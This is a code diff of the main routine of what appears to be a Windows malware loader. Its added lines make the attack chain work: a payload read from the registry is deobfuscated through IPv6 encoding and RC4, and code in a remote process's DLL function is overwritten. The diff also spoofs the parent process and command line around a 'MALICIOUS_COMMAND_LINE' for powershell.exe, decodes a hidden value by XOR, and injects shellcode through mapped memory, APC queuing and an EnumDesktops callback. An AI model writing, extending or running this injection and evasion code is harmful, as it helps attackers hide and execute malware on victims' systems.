@@ -2,45 +2,38 @@
 typedef void(WINAPI* pdllMainFunction)();
 int main()
 {
-	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hPayloadObjectHandle = 0;
-	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId =0;
+	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hThread2= 0, hPayloadObjectHandle = 0;
+	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId = 0, dwThreadId1 = 0, dwThreadId2 = 0;
 	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
 	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
 	Context RC4Context_t;
 	RESOURCE resource;
 	PVOID pExPayload, pStompingTarget = NULL;
-	LPWSTR TargetProcessName = L"RuntimeBroker.exe";
+	LPWSTR TargetProcessName = L"svchost.exe";
 	LPSTR  pTargetProcessName = "RuntimeBroker.exe";
-	//if(!FetchLocalAlertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
+	PPEB   pProcessEnvironmentBlock_t = NULL;
+
+	if(!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
+
 	EnumRemoteProcessHandle(TargetProcessName, &dwPID0, &hProcess);
+
+	//if (EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess) == FALSE) return -2;
+
+	FetchImageHeaders(hProcess, &pProcessEnvironmentBlock_t);
+
+	//getchar();
 
 	FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget);
 
-	//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
-
-	/*if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
-	{
-	wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
-		return -1;
-	}
-	*/
-	
-
-
-
-	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) return -2;
-
-	//wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
-
 	if (!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
 
-	if (!(pKey = LocalAlloc(LPTR,256))) return -2;
-		
+	if (!(pKey = LocalAlloc(LPTR, 256))) return -2;
+
 	if (!DeobfuscatePayloadIPv6(
-		(PUCHAR*)&pKey, 
-		pObfOutput, 
+		(PUCHAR*)&pKey,
+		pObfOutput,
 		sObfuscatedSize + 1,
-		&sClearPayload, 
+		&sClearPayload,
 		(unsigned char)(sPaddedInputSize - sOriginalInputSize)
 	)) return -3;
 
@@ -50,97 +43,61 @@ int main()
 
 	if (!(pObfInput = LocalAlloc(LPTR, resource.sSize))) return -14;
 
-	
 	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
 
 	rFin(&RC4Context_t, (PVOID)resource.pAddress, pObfInput, resource.sSize);
 
 	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
 
-	//InjectPayloadRemoteMappedMemory(pStompingTarget, &pExtPayloadAddres, &pObfInput, resource.sSize, &hPayloadObjectHandle, hProcess);
+	BYTE pTargetSubDirectory[9] = { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00, };
+	BYTE pXorKey[8] = { 0xB3,  0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };
+	CHAR pOutput[9] = { '\0' };
 
-	//APCPayloadInjection(hThread, pObfInput, resource.sSize);
-	//InjectRemoteDll(pObfInput, hProcess, SACRIFICIAL_DLL, SACRIFICIAL_FUNC, resource.sSize, &pStompingTarget);
-
-	/*Payload Execution Control Code
-	if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")))
-	{
-		printf("[i] Created A Semaphore Successfully!\n");
-	}
-	HANDLE
-		hEvent = CreateEventA(NULL, FALSE, FALSE, "Control String1"),
-		hMutex = CreateMutexA(NULL, FALSE, "Control String2");
-	printf("[i] Created A Event Successfully!\n");
-	printf("[i] Created A Mutex Successfully!\n");
-
-	if (!FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget)) return -12;
-	if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
-
-	for (int i = 0; i < 10; i++) {
-		
-		if ((hEvent = CreateEventA(NULL, FALSE, FALSE, "Control String1")) != NULL && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create An Event Will Not Execute, as a Semaphore already Exists!!!\n");
-		else 
-		{
-			printf("[i] Created Another Event!");
-			if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
-
-		}
-		if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")) && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create a Event, as a Event already Exists!!!\n");
-		else
-		{
-			printf("[i] Created Semaphore!");
-			if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
-
-		}
-		if ((hMutex = CreateMutexA(NULL, FALSE, "Control String2")) != NULL && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create a Mutex, as a Mutex already Exists!!!\n");
-		else
-		{
-			printf("[i] Created Another Mutex!");
-			if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
-
-		}
-
-	}
-	*/
-
-	//if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hPayloadObjectHandle))return -7;
-
-	//InjectPayloadRemoteMappedMemory(pExtPayloadAddres, &pExtPayloadAddres, resource.sSize, &hPayloadObjectHandle, hProcess);
-
-	//SetupScanFileQueueA(NULL, NULL, NULL, NULL, NULL, NULL);
-	
-	//printf("0x%p\n", pStompingTarget);
-
-	//UnmapViewOfFile(pObfInput);
-
-	//HijackThread(hThread, pStompingTarget);
-
-	
-
-	BYTE pTargetSubDirectory[9] = {0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00,};
-	BYTE pXorKey[8] = {0xB3,  0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33};
-	CHAR  pOutput[9] = { '\0' };
-
-
-	for (UCHAR i = 0 ; i < 8; i++)
+	for (UCHAR i = 0; i < 8; i++)
 	{
 		pOutput[i] = pTargetSubDirectory[i] ^ pXorKey[i];
 	}
 
-
-	//SpoofCommandLineArguments(SPOOFED_COMMAND_LINE, MALICIOUS_COMMAND_LINE, sizeof(L"powershell.exe"), &hProcess2, &dwPID2, &hPayloadObjectHandle, &dwThreadId);
-
 	SpoofProcessCLA_PPID(
-		SPOOFED_COMMAND_LINE, 
+		SPOOFED_COMMAND_LINE,
 		hProcess,
-		MALICIOUS_COMMAND_LINE, 
+		MALICIOUS_COMMAND_LINE,
 		sizeof(L"powershell.exe"),
 		pOutput,
-		&hProcess1, 
+		&hProcess1,
 		&dwPID1 ,
 		&hThread,
 		&dwThreadId
 	);
+
+	//SpoofParentProcessId(pTargetProcessName, hProcess, &dwPID1, &hProcess1, &dwThreadId, &hThread);
+
+	hProcess1 = OpenProcess(PROCESS_VM_OPERATION, FALSE, dwPID1);
+
+	InjectPayloadRemoteMappedMemory(pObfInput, &pExtPayloadAddres, (PUCHAR*)&pExPayload, resource.sSize, &hPayloadObjectHandle, hProcess1);
+
+	hThread2 = OpenThread(THREAD_SET_CONTEXT, FALSE, dwThreadId);
+
+	Sleep(100);
+
+	if (!QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread2, 0)) {
+		printf("[!] Queue User APC Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
+
+	WaitForSingleObjectEx(hThread1, INFINITE, TRUE);
+
+	Sleep(100);
+
+	ResumeThread(hThread);
+
+	WaitForSingleObjectEx(hThread1, INFINITE, TRUE);
+
+	WaitForSingleObjectEx(hProcess1, INFINITE, TRUE);
+
+	//SpoofCommandLineArguments(SPOOFED_COMMAND_LINE, MALICIOUS_COMMAND_LINE, sizeof(L"powershell.exe"), &hProcess2, &dwPID2, &hPayloadObjectHandle, &dwThreadId);
+
+	
 
 	//hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);
 
@@ -160,19 +117,19 @@ int main()
 
 	//QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread, 0);
 	
-	//InjectCallbackPayloadEnumDesktops(pObfInput, (DWORD)resource.sSize, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
+	InjectCallbackPayloadEnumDesktops(pObfInput, (DWORD)resource.sSize, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
 
 	//WaitForSingleObject(hThread, 150);
 
 	//if (!UnmapViewOfFile(pObfInput)) printf("[x] Remote memory Unmapping Failed With Error 0x%lx", GetLastError());
 	
-	printf("Injecting Shellcode At Address: 0x%p\n", pStompingTarget);
+	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddres);
 
 	getchar();
 
 	//DebugActiveProcessStop(dwPID1);
 
-	ResumeThread(hThread);
+	//ResumeThread(hThread);
 
 	//CloseHandle(hThread);
 
@@ -186,6 +143,83 @@ int main()
 
 	return 0;
 }
+
+
+
+//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
+
+//MapLocalMemory(pObfInput, &pExPayload, resource.sSize, &hPayloadObjectHandle);
+
+
+/*if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess))
+{
+wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
+	return -1;
+}
+*/
+
+//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) return -2;
+
+//wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
+
+//InjectPayloadRemoteMappedMemory(pStompingTarget, &pExtPayloadAddres, &pObfInput, resource.sSize, &hPayloadObjectHandle, hProcess);
+
+//APCPayloadInjection(hThread, pObfInput, resource.sSize);
+//InjectRemoteDll(pObfInput, hProcess, SACRIFICIAL_DLL, SACRIFICIAL_FUNC, resource.sSize, &pStompingTarget);
+
+/*Payload Execution Control Code
+if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")))
+{
+	printf("[i] Created A Semaphore Successfully!\n");
+}
+HANDLE
+	hEvent = CreateEventA(NULL, FALSE, FALSE, "Control String1"),
+	hMutex = CreateMutexA(NULL, FALSE, "Control String2");
+printf("[i] Created A Event Successfully!\n");
+printf("[i] Created A Mutex Successfully!\n");
+
+if (!FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget)) return -12;
+if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
+
+for (int i = 0; i < 10; i++) {
+
+	if ((hEvent = CreateEventA(NULL, FALSE, FALSE, "Control String1")) != NULL && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create An Event Will Not Execute, as a Semaphore already Exists!!!\n");
+	else
+	{
+		printf("[i] Created Another Event!");
+		if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
+
+	}
+	if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")) && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create a Event, as a Event already Exists!!!\n");
+	else
+	{
+		printf("[i] Created Semaphore!");
+		if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
+
+	}
+	if ((hMutex = CreateMutexA(NULL, FALSE, "Control String2")) != NULL && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create a Mutex, as a Mutex already Exists!!!\n");
+	else
+	{
+		printf("[i] Created Another Mutex!");
+		if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;
+
+	}
+
+}
+*/
+
+//if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hPayloadObjectHandle))return -7;
+
+//InjectPayloadRemoteMappedMemory(pExtPayloadAddres, &pExtPayloadAddres, resource.sSize, &hPayloadObjectHandle, hProcess);
+
+//SetupScanFileQueueA(NULL, NULL, NULL, NULL, NULL, NULL);
+
+//printf("0x%p\n", pStompingTarget);
+
+//UnmapViewOfFile(pObfInput);
+
+//HijackThread(hThread, pStompingTarget);
+
 	//if (!APCPayloadInjection(hThread1, pExPayload, pPayload_t.sText)) return -6;
 
 	//if (!InjectRemoteProcessShellcode(hProcess, pPayload_t.pText, pPayload_t.sText, &pExPayload))printf("[!] Failed To Inject Shellcode!\n");
